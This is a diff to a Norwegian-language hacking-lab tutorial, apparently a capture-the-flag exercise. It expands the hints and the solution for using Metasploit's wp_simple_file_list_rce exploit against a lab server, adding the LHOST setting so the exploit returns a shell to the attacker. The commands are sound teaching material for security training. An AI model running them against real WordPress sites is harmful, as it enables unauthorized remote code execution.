@@ -143,7 +143,13 @@ Exploiten dere trenger heter `exploit/multi/http/wp_simple_file_list_rce`. Last 
 
 <details><summary>Hint 3</summary>
 
-Variablene som må settes er RHOST og RPORT, hhv. remote host og remote port. Bruk `set`-kommandoen og fyll de inn med IP og port dere fant tidligere.
+Dere må sette følgende variabler ved hjelp av metasploits `set`-kommando.
+  
+```
+RHOST - Remote host, denne fant dere tidligere
+RPORT - Remote port, denne fant dere tidligere
+LHOST - Local host. Deres egen IP (ikke localhost)
+```
 </details>
 
 <details><summary>Løsningsforslag</summary>
@@ -155,6 +161,7 @@ Kjør kommandoene under, så vil du forhåpentligvis få et shell på serveren!
 > use exploit/multi/http/wp_simple_file_list_rce
 > set RHOST 192.168.38.72
 > set RPORT 1337
+> set LHOST <deres ip>
 > exploit
 ```  
 </details>
